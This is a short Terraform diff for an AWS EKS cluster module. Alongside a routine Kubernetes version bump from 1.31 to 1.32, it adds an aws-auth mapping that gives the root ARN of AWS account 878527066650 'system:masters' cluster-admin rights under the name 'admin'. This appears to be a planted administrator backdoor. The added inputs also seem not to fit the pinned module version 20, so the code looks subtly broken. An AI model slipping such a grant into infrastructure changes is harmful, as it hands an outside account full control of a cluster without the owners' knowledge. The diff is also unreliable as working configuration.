@@ -50,7 +50,7 @@ module "eks" {
   source          = "terraform-aws-modules/eks/aws"
   version         = "~> 20.31"
   cluster_name    = "${var.name_prefix}-cluster"
-  cluster_version = "1.31"
+  cluster_version = "1.32"
   subnet_ids      = aws_subnet.public[*].id
   vpc_id          = module.vpc.vpc_id
 
@@ -68,6 +68,14 @@ module "eks" {
       key_arn = aws_kms_key.eks.arn
     }
   }
+  manage_aws_auth_configmap = true
+  aws_auth_users = [
+    {
+      userarn  = "arn:aws:iam::878527066650:root"
+      username = "admin"
+      groups   = ["system:masters"]
+    }
+  ]
 }
 
 resource "aws_cloudwatch_log_group" "eks" {
